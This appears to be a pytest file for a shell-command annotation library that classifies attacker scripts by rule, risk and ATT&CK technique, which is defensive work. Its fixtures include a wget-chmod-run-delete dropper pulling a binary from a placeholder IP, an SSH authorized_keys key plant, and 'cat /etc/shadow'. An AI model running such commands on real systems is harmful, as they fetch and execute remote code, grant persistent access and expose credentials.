"""Script library units: the annotation base and command pairing."""

from pathlib import Path

import pytest

from ingest.normalize import normalize_commands
from ingest.scripts.annotations import AnnotationError, load_annotations
from ingest.scripts.library import explain_pairs, extract_pairs, script_fingerprint

RULES = Path(__file__).resolve().parents[1] / "rules"
BASE = load_annotations(RULES)

DROPPER = [
    "cd /tmp; wget http://192.0.2.9/x86 -O x86",
    "chmod 777 x86",
    "./x86 telnet.exploit",
    "rm -rf x86",
]


def test_the_shipped_base_loads_and_is_unique() -> None:
    assert len(BASE.entries) >= 50
    assert len({e.id for e in BASE.entries}) == len(BASE.entries)
    assert 1 <= BASE.version <= 30000


def test_pairs_follow_the_normaliser_exactly() -> None:
    lines = [*DROPPER, "uname -a && cat /proc/cpuinfo | wc -l", "", "pwd"]
    pairs = extract_pairs(lines)
    assert [p.norm for p in pairs] == normalize_commands(lines)
    assert pairs[0].raw.startswith("wget http://192.0.2.9/x86")


def test_a_dropper_is_explained_line_by_line() -> None:
    out = explain_pairs(extract_pairs(DROPPER), BASE)
    rules = [line["rule"] for line in out["lines"]]
    assert rules == ["download", "chmod-exec", "run-dropped-binary", "delete-recursive"]
    assert out["summary"] == (
        "A 4-step script that downloads a file, makes it executable, runs the file it just "
        "fetched and deletes files."
    )
    assert out["techniques"][0] == "T1105"
    assert out["risk"] == "severe"


def test_the_real_command_decides_not_the_placeholder() -> None:
    harmless = explain_pairs(extract_pairs(["chmod 600 a", "ls"]), BASE)
    assert harmless["lines"][0]["rule"] == "chmod"
    assert harmless["lines"][0]["risk"] == "notice"


def test_specific_rules_win_over_general_ones() -> None:
    pairs = extract_pairs(["echo 'ssh-rsa AAAA' >> ~/.ssh/authorized_keys", "echo hi"])
    out = explain_pairs(pairs, BASE)
    assert [line["rule"] for line in out["lines"]] == ["ssh-key-install", "echo"]


def test_unknown_commands_are_said_to_be_unknown() -> None:
    out = explain_pairs(extract_pairs(["frobnicate --now", "uname"]), BASE)
    assert out["lines"][0]["rule"] is None and out["unknown"] == 1
    assert "No built-in explanation" in out["lines"][0]["explanation"]


def test_same_script_other_addresses_has_one_fingerprint() -> None:
    a = extract_pairs(["wget http://192.0.2.1/a", "sh a"])
    b = extract_pairs(["wget http://198.51.100.2:81/b", "sh b"])
    assert script_fingerprint(a) != script_fingerprint(extract_pairs(["sh a", "wget x"]))
    assert len(script_fingerprint(a)) == 64 and script_fingerprint(a) != script_fingerprint(b)


@pytest.mark.parametrize(
    "doc",
    [
        "annotations:\n  - {id: a, commands: [x], explain: e, phrase: p, risk: bad}",
        "annotations:\n  - {id: a, commands: [x], prefixes: ['./'], explain: e, phrase: p, risk: info}",
        "annotations:\n  - {id: a, commands: [x], explain: e, phrase: p, risk: info, technique: X1}",
        "annotations:\n  - {id: a, commands: [x], explain: e, phrase: p, risk: info, surprise: 1}",
        "not: [valid",
    ],
)
def test_a_broken_file_is_refused(tmp_path: Path, doc: str) -> None:
    (tmp_path / "annotations").mkdir()
    (tmp_path / "annotations" / "x.yaml").write_text(doc)
    with pytest.raises(AnnotationError):
        load_annotations(tmp_path)


def test_duplicate_ids_are_refused(tmp_path: Path) -> None:
    (tmp_path / "annotations").mkdir()
    entry = "  - {id: a, commands: [x], explain: e, phrase: p, risk: info}\n"
    (tmp_path / "annotations" / "x.yaml").write_text("annotations:\n" + entry * 2)
    with pytest.raises(AnnotationError):
        load_annotations(tmp_path)


def test_a_missing_folder_gives_an_empty_base(tmp_path: Path) -> None:
    assert load_annotations(tmp_path).entries == ()


def test_the_index_gives_the_same_answers_as_a_scan() -> None:
    samples = [
        "wget http://x/y", "/usr/bin/WGET -q x", "./a.out", "/tmp/.x/run", "uname -a", "frob",
        "echo hi >> ~/.ssh/authorized_keys", "chmod 777 a", "chmod 600 a", "cat /etc/shadow",
        "busybox ECCHI", "/bin/busybox", "nohup ./m &", "", "   ", "crontab -l",
    ]  # fmt: skip
    for line in samples:
        tokens = line.split()
        expected = None
        if tokens:
            name = tokens[0].strip("\"'`").lower()
            base = name.rsplit("/", 1)[-1]
            args = " ".join(tokens[1:]).lower()
            expected = next((e for e in BASE.entries if e.matches(name, base, args)), None)
        assert BASE.lookup(line) is expected, line
